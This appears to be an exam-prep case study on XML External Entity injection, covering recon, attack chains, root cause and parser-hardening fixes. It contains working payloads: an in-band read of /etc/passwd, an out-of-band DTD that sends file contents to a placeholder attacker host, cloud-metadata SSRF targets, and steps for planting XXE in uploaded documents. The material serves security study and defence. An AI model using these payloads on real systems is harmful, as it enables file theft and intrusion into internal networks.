# XXE File Read / SSRF Case Study

## Environment

- Host OS: Kali + target (Java/PHP/.NET XML parser)
- App: Any app accepting XML uploads or POST bodies (SOAP, SVG uploads, DOCX/XLSX imports, custom config importers, RSS/Atom feeds, etc.)
- Parser: Java DocumentBuilder / SAX (default), PHP libxml, .NET XmlReader, etc.
- URL: http://target:8080/api/xml or file upload endpoint
- Key ports: app port + attacker callback listener (80/HTTP for OOB)

**Lab targets**: XXE-Study GitHub repo, custom Spring/Flask/PHP endpoints, GoSecure XXE workshop materials.

## Recon

- Entry points: Any endpoint that:
  - Accepts `Content-Type: application/xml` or `text/xml`
  - Accepts file uploads that are parsed as XML (SVG, Office docs that are ZIP+XML, XHTML, etc.)
  - Has "import from URL" or RSS/Atom features
- Roles: Often unauth or low-priv (public APIs, user profile picture "SVG", document upload).
- Sinks: `DocumentBuilder.parse`, `SAXParser`, `XMLInputFactory`, `simplexml_load_string` (PHP), `XmlReader.Create` without proper settings.

**Quick black-box test**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

If contents of /etc/passwd appear in the response (or error), you have in-band XXE file read.

## Vulnerability Hypothesis

- Suspected class: XML External Entity (XXE) Injection (CWE-611).
- Data flow: Attacker-controlled XML (body, uploaded file, or fetched from attacker URL) → XML parser with external entity resolution enabled (the default in many libraries) → `SYSTEM` / `PUBLIC` entities resolve to `file://`, `http://`, `ftp://`, `php://`, `expect://` etc. → data exfiltration or SSRF.
- Preconditions: Parser not hardened (no `disallow-doctype-decl`, external entities still allowed).

## Chain Outline

1. **Confirm XXE** with simple in-band payload (file read of a known file like `/etc/hostname` or `C:\Windows\win.ini`).
2. **In-band file read** for quick wins (passwd, web.xml, source files, config with creds).
3. **OOB / Blind XXE** (when no direct reflection):
   - Host a malicious DTD on attacker server.
   - Use `<!ENTITY % dtd SYSTEM "http://attacker/dtd"> %dtd;`
   - In DTD: `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % send SYSTEM "http://attacker/?data=%file;"> %send;`
4. **SSRF variants**: `http://169.254.169.254/latest/meta-data/` (AWS), internal services, Redis, etc.
5. **Protocol tricks**: `php://filter/read=convert.base64-encode/resource=index.php` (PHP), `jar:`, `dict:`, `gopher:` for advanced SSRF.
6. **Escalate**: Use read source/config → find other vulns (deserial keys, SQL creds, etc.). Or direct RCE via some protocols (rare, e.g. expect:// on PHP).

## Evidence

- Response bodies containing file contents.
- Your HTTP/DNS server logs showing exfil callbacks with base64 or URL-encoded file data.
- Screenshots of decoded exfil.
- For SSRF: internal service responses or metadata.

## Findings

### Root Cause
XML parsers, by design, support External Entities for modularity (like C `#include`). When processing untrusted XML, the parser will happily fetch and include content from `SYSTEM` URIs unless explicitly told not to. Most libraries ship in "convenient but insecure" default mode.

```java
// VULNERABLE (default in many JDKs)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(...);
```

The three critical features that must be disabled for safety:
- `http://apache.org/xml/features/disallow-doctype-decl` → true
- `http://xml.org/sax/features/external-general-entities` → false
- `http://xml.org/sax/features/external-parameter-entities` → false

Similar settings exist for PHP (`libxml_disable_entity_loader(true)` — deprecated but concept lives on), .NET (`XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`), etc.

### In-Band vs Out-of-Band (OOB) vs Blind

- **In-band**: Data comes back in the HTTP response. Easiest.
- **OOB**: Data sent to attacker-controlled server (HTTP param, DNS subdomain, FTP). Required when no reflection or when files are too large/sensitive for response.
- **Blind / error-based**: Differences in error messages, response times, or boolean conditions (e.g. entity that causes parse error only if file exists).

### Useful Protocols & Tricks

See `guides/XXE-Attack-Vectors.md` and `poc-examples/xxe-file-read-ssrf/Notes.md` (the 59-line poc Notes + 653-line poc.py) for DTD templates and payload_server integration.

- `file://` — local file read (absolute paths, watch encoding).
- `http://` / `https://` — SSRF.
- `php://filter/...` (PHP) — read + encode local files even without file:// support.
- `jar://` (Java) — read files inside JARs or zips.
- `gopher://`, `dict://`, `ftp://` — advanced SSRF / exploitation of other services.

### Fix Ideas

- Disable DTDs and external entities at parser creation (see above).
- Use a less feature-rich parser or data format (JSON) when possible.
- If XML is required from untrusted sources, parse in a sandboxed process with no network and minimal filesystem access.
- Whitelist allowed entities / protocols if you truly need some external resolution.
- For file uploads: validate magic bytes + extension + re-generate safe versions instead of trusting the original XML.

## OSWE Exam Tips

- **Always test XXE** on any XML-accepting endpoint or "import document" feature. It is fast to test and high impact.
- Start with in-band file read of obvious files (`/etc/passwd`, `C:\inetpub\wwwroot\web.config`, application source).
- When in-band fails, immediately go OOB with a DTD on your payload server (the advanced skeleton has `payload_server.py` + `modules/payloads.py` has XXE helpers).
- Office docs (docx = zip of XML) are classic vectors — unzip, plant XXE in document.xml, re-zip, upload.
- SVG uploads for profile pictures or "custom icons" are frequent in real apps and CTFs.
- SSRF via XXE is often the only unauthenticated way into internal networks or metadata services.
- Chaining: XXE file read of web.xml or config → discover deserial endpoints or creds → combine with other techniques.
- Time: XXE is usually quick to find and exploit once you have the DTD pattern memorized. Spend the saved time on the harder chains.

## References

- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- PayloadsAllTheThings XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- GoSecure XXE Workshop (free)
- `guides/XXE-Attack-Vectors.md` (400+ lines, DTD construction, all protocols, code review)
- `poc-examples/xxe-file-read-ssrf/` (full PoC with OOB DTD + callback server + detailed Notes.md)

Use `notes/CASE-template.md` when you encounter a new XXE variant (different parser, new protocol trick, chained with upload, etc.).
